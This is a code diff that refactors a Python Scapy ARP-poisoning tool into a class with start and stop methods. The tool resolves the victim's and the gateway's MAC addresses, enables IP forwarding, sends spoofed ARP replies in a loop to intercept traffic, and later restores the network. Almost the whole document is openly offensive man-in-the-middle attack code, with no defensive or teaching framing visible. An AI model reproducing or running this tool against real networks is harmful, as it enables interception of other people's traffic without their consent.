@@ -1,12 +1,7 @@
 from scapy.all import *
 import time
-import threading
 from utils.network_utils import get_mac_address, get_local_mac
 from utils.ip_forward import enable_ip_forwarding, disable_ip_forwarding
-from utils import get_gateway_ip
-import os
-import socket
-import argparse
 
 def poison_arp(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, interface):
     """
@@ -63,7 +58,7 @@ def restore_network(victim_ip, victim_mac, gateway_ip, gateway_mac, interface):
     except Exception as e:
         print("Failed to restore network: %s" % str(e))
 
-def run(args, stop_event):
+class ArpPoisoner():
     """
     Function to run the ARP poisoning attack.
     
@@ -75,30 +70,39 @@ def run(args, stop_event):
     - Restores the ARP tables of the victim and the gateway when the attack is stopped.
     - Prints status messages indicating the start, stop, and success of the ARP poisoning.
     """
-    if not args.victim_mac:
-        args.victim_mac = get_mac_address(args.victim_ip, interface=args.interface)
-        if not args.victim_mac:
-            print("Failed to find MAC address for victim IP: {}".format(args.victim_ip))
-            return
+    args = None
+    running = None
+    def __init__(self, args):
+        self.args = args
+        self.running = False
+        if not self.args.victim_mac:
+            self.args.victim_mac = get_mac_address(self.args.victim_ip, interface=self.args.interface)
+            if not args.victim_mac:
+                print("Failed to find MAC address for victim IP: {}".format(self.args.victim_ip))
+                return
 
-    if not args.gateway_mac:
-        args.gateway_mac = get_mac_address(args.gateway_ip, interface=args.interface)
-        if not args.gateway_mac:
-            print("Failed to find MAC address for gateway IP: {}".format(args.gateway_ip))
-            return
+        if not self.args.gateway_mac:
+            self.args.gateway_mac = get_mac_address(self.args.gateway_ip, interface=self.args.interface)
+            if not args.gateway_mac:
+                print("Failed to find MAC address for gateway IP: {}".format(self.args.gateway_ip))
+                return
 
-    if not args.attacker_mac:
-        args.attacker_mac = get_local_mac(interface=args.interface)
-        if not args.attacker_mac:
-            print("Failed to find MAC address for attacker interface: {}".format(args.interface))
-            return
+        if not self.args.attacker_mac:
+            self.args.attacker_mac = get_local_mac(interface=self.args.interface)
+            if not self.args.attacker_mac:
+                print("Failed to find MAC address for attacker interface: {}".format(self.args.interface))
+                return
    
-    enable_ip_forwarding()
+    def start(self):
+        enable_ip_forwarding()
+        self.running = True
+        while self.running:
+            poison_arp(self.args.victim_ip, self.args.victim_mac, self.args.gateway_ip, self.args.gateway_mac, self.args.attacker_mac, self.args.interface)
+            time.sleep(1)
 
-    while not stop_event.is_set():
-        poison_arp(args.victim_ip, args.victim_mac, args.gateway_ip, args.gateway_mac, args.attacker_mac, args.interface)
-        time.sleep(1)
-    print("Stopping ARP poisoning and restoring network...")
-    restore_network(args.victim_ip, args.victim_mac, args.gateway_ip, args.gateway_mac, args.interface)
-    disable_ip_forwarding()
+    def stop(self):
+        self.running = False
+        print("Stopping ARP poisoning and restoring network...")
+        restore_network(self.args.victim_ip, self.args.victim_mac, self.args.gateway_ip, self.args.gateway_mac, self.args.interface)
+        disable_ip_forwarding()
 
